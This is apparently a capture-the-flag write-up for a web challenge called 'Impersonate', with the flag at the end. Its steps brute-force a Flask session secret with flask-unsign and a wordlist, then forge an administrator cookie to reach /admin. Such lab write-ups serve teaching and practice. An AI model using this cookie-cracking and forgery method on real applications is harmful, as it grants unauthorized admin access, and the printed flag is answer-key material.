# Impersonate 

Solved by: @Cookies to SELL

- Category: web
- Description: One may not be the one they claim to be.
- Challenge File: app.py

### Solutions:

1. Login as any user at first place. (Just notice the cookies quite different since different timezone).(useless cookies in script):X
2. flask-unsign --wordlist hello.txt --unsign --cookie 'cookiesfromwebsite' --no-literal-eval >> will return secret.
3. flask-unsign --sign --secret <puthere> --cookie "{'is\_admin': True, 'uid': '02ec19dc-bb01-5942-a640-7099cda78081', 'username': 'administrator'}"
4. access /admin endpoint and change cookies from step3. 


**Flag:** `PCTF{Imp3rs0n4t10n_Iz_Sup3r_Ezz}`

